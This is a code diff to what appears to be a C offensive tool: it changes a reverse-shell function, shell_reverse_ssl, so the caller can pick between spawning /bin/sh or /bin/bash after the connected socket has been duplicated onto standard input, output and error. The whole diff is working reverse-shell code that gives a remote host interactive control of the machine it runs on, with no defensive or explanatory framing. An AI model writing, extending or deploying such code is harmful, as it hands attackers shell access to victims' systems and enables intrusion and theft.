@@ -57,7 +57,7 @@ bool shell_reverse_tcp(char *host, int host_port){
   return true;
 }
 
-bool shell_reverse_ssl(char *host, int host_port){
+bool shell_reverse_ssl(char *host, int host_port, char *type){
   /*
     :TODO: send reverse shell
     :host: domain or ip address
@@ -82,8 +82,17 @@ bool shell_reverse_ssl(char *host, int host_port){
   for (int i = 0; i <= 2; i++){
     dup2(sockfd, i);
   }
-  execve("/bin/sh",
-         (char *[]){"bin/sh", 0},
-         environ);
+  if (strcmp(type, "sh") == 0){
+    execve("/bin/sh",
+           (char *[]){"bin/sh", 0},
+           environ);
+  } else if (strcmp(type, "bash") == 0){
+    execve("/bin/bash",
+           (char *[]){"bin/bash", 0},
+           environ);
+  } else{
+    fprintf(stderr, "error: reverse shell type is unsupported");
+    return false;
+  }
   return true;
 }
